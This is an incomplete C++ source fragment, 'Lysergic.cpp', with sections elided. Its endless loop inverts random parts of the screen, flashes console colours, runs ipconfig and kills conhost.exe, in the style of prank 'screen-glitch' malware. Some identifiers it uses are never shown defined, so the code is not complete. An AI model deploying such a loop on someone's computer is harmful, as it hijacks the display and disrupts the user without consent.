// Lysergic.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
...
int main()
{
	...
	while (0 == 0) {
		int rand_x, rand_y;
		int offSet_w, offset_z;
		rand_x = rand() % x + 0;
		rand_y = rand() % y + 0;

		
		BitBlt(GetDC(NULL), rand() % x + 0, rand() % y + 0, rand_x + 200, rand_y + 200, GetDC(NULL), rand_x, rand_y, NOTSRCCOPY);
		BitBlt(hdc, x, 0, y, rand_x, hdc, rand_y, 0, NOTSRCCOPY);
		Sleep(100);
		system("color 1a");
		system("color 1b");
		system("color 1c");
		...
		system("ipconfig");
		system("pause");
		system("taskkill /im conhost.exe");
